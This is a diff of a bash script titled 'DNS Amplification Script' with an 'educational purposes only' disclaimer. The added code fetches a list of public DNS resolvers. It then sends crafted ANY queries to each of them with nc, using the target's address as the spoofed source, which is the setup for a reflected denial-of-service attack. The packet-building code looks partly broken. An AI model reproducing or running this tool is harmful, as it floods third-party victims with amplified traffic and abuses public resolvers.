@@ -1,49 +1,12 @@
 #!bin/bash
 
-function get_public_dns_servers {
-    
-    source .env
-    TMP_FILE=$(mktemp)
-
-    curl -s $DNS_SERVER_LIST_URL > $TMP_FILE
-    DNS_SERVERS=$(cat $TMP_FILE | grep -v '#' | awk '{print $1}')
-
-    echo $DNS_SERVERS > $DNS_SERVER_LIST_FILE
-    rm $TMP_FILE
-}
-
-function read_dns_servers {
-    DNS_SERVERS=$(cat dns_servers.txt)
-    echo $DNS_SERVERS
-}
-
-amplify() {
-    local target_ip="$1"
-    local query_type="ANY"
-    local dns_server="8.8.8.8"
-    local port="53"
-
-    while getopts "t:s:p:" opt; do
-        case "${opt}" in
-            t) query_type="${OPTARG}" ;;
-            s) dns_server="${OPTARG}" ;;
-            p) port="${OPTARG}" ;;
-            *) banner; return 1 ;;
-        esac
-    done
-
-    local query="$(echo -ne '\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00')"
-    query="${query}$(echo -ne "${query_type}" | xxd -p -c1)"
-    query="${query}$(echo -ne '\x00\x01')"
-
-    local response="$(timeout 2s dig @${dns_server} -p ${port} ${target_ip} ${query} +tries=1 +time=1 +noedns +noad +nocl +nolookup +noadditional +nostats +nocmd +noquestion +nocomments +noclass +nostderr +noanswer +noauthority +noheader +short)"
-
-    if [[ -n "${response}" ]]; then
-        echo "${response}"
-    else
-        echo "No response received"
-    fi
-}
+###########################
+# DNS Amplification Script
+# Author: David Stromberger
+# License: MIT
+# Version: 1.0
+# Disclaimer: This script is for educational purposes only. I am not responsible for any damage caused by this script.
+###########################
 
 function banner {
     echo -e "\e[38;5;208m===================================="
@@ -57,6 +20,61 @@ function banner {
     echo -e "\e[38;5;39m  -p <port>        DNS server port (default: 53)"
     echo ""
     echo -e "\e[38;5;39mExample: dns-bash 192.168.1.100 -t ANY -s 1.1.1.1 -p 53"
+}
+
+function send_dns_query {
+    local src_ip="$1"
+    local port="$2"
+    local query_type="$3"
+    local resolver="$4"
+
+    local txid=$(od -An -N2 -t x2 /dev/random)
+    
+    local packet=$(printf "\x${txid:0:2}\x${txid:2:2}\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00")
+    echo $packet
+    local query=$(echo -n "$query_type" | sed 's/\./\\./g')
+    local packet+=$(printf "\x${#query}\x${query}\x00\x00\x01\x00\x01")
+
+    if ! command -v nc &> /dev/null; then
+        echo "nc command not found"
+        return 1
+    fi
+    
+    if ! echo -n "$packet" | nc -u -w1 -s "$src_ip" "$resolver" "$port" > /dev/null; then
+        echo "Failed to send DNS query"
+        return 1
+    fi
+
+}
+
+function amplify {
+    local target_ip="$1"
+    local port="$2"
+    local query_type="$3"
+    local resolver="$4"
+
+    local dns_servers=$(read_dns_servers)
+
+    for dns_server in $dns_servers; do
+        echo -e "\e[38;5;208mSending DNS query to $dns_server"
+        send_dns_query $target_ip $port $query_type $dns_server
+    done
+}
+
+function get_public_dns_servers {
+    source .env
+    TMP_FILE=$(mktemp)
+
+    curl -s $DNS_SERVER_LIST_URL > $TMP_FILE
+    DNS_SERVERS=$(cat $TMP_FILE | grep -v '#' | awk '{print $1}')
+
+    echo $DNS_SERVERS > $DNS_SERVER_LIST_FILE
+    rm $TMP_FILE
+}
+
+function read_dns_servers {
+    DNS_SERVERS=$(cat $DNS_SERVER_LIST_FILE)
+    echo $DNS_SERVERS
 }
 
 function main {
@@ -100,4 +118,5 @@ function main {
     get_public_dns_servers
 }
 
-amplify 192.168.2.1
+get_public_dns_servers
+amplify 127.0.0.1 53 ANY 8.8.8.8
